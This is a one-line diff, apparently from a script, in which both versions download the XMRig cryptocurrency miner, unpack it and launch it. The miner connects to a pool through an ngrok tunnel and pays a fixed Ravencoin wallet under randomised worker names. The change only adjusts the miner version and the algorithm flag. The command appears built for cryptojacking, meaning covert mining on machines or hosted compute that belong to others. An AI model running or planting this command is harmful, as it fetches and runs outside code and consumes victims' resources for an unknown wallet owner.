@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz && tar -zxf xmrig-6.18.0-linux-x64.tar.gz && cd xmrig-6.18.0 && ./xmrig -o 2.tcp.ngrok.io:16879 -a rx/0 -k -u RVN:RRzL8NpRvYccXCaBXbm4BVyVSja3tGmMqs.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -zxf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig -o 2.tcp.ngrok.io:16879 -a rx -k -u RVN:RRzL8NpRvYccXCaBXbm4BVyVSja3tGmMqs.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x
